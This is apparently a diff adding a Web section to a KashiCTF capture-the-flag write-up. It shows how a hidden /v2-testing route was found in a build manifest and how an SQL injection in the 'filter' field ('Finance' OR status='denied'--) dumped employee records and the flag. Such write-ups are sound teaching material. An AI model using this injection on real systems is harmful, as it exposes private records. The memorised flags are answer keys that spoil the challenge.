@@ -777,3 +777,56 @@ com.discord--vUJ-073y2BPpJsJHJa6Rw==
 If I remember correctly, I've tried them in order, skipping chrome and webview: `com.instagram.lite`, `com.facebook.lite`, `com.mojang.minecraftpe` (not sure if I tried this one) and `com.google.calendar.android`, which ended up being the correct one.
 
 Flag: `KashiCTF{com.google.calendar.android}`
+
+## Web
+
+### Corporate Life 1
+
+A hidden route for a testing version of the web application is present in the build manifest:
+
+```javascript
+self.__BUILD_MANIFEST = function(e, r, s) {
+    return {
+        __rewrites: {
+            afterFiles: [],
+            beforeFiles: [],
+            fallback: []
+        },
+      // [...]
+        "/": ["static/chunks/pages/index-6413244cd5618b98.js"],
+        "/_error": ["static/chunks/pages/_error-fde50cb7f1ab27e0.js"],
+        "/v2-testing": ["static/chunks/pages/v2-testing-fb612b495bb99203.js"],
+        sortedPages: ["/", "/_app", "/_error", "/v2-testing"]
+    }
+}(0, 0, 0),
+self.__BUILD_MANIFEST_CB && self.__BUILD_MANIFEST_CB();
+```
+
+The new application is acccessible at http://kashictf.iitbhucybersec.in:58009/v2-testing.
+
+Contrary to the older version of the website, which listed employee requests with a GET request on `/api/list`, this one posts a request on `/api/list-v2`. It can filter employees by name, with the "name" field in the POST request, or by department, using the "filter" field.
+
+There is a SQL injection in the "filter" field. This can be seen with such requests, that lead to a server error:
+
+```python
+import requests
+
+r = requests.post("http://kashictf.iitbhucybersec.in:58009/api/list-v2", data={"filter": "'"})
+print(r.json())
+```
+
+The error message is `{'error': 'Internal Server Error: Database communication failed'}`.
+
+We know the user that stored a secret has a "denied" status. A possible injection to list such users would be: `{"filter": "Finance' OR status='denied'--"}`.
+
+This returns the list of employees with a denied request:
+
+```json
+[
+  {'employee_name': 'olivia.king', 'request_detail': 'Review vendor contracts', 'status': 'denied', 'department': 'Finance', 'role': 'Accountant', 'email': 'olivia.king@corp.com'}
+  {'employee_name': 'peter.johnson', 'request_detail': 'Shitty job, I hate working here, I will leak all important information like KashiCTF{s4m3_old_c0rp0_l1f3_LcUDGCBs}', 'status': 'denied', 'department': 'Logistics', 'role': 'Supply Chain Manager', 'email': 'peter.johnson@corp.com'}
+  {'employee_name': 'richard.collins', 'request_detail': 'Draft public relations statement', 'status': 'denied', 'department': 'Public Relations', 'role': 'PR Specialist', 'email': 'richard.collins@corp.com'}
+]
+```
+
+Flag: `KashiCTF{s4m3_old_c0rp0_l1f3_LcUDGCBs}`
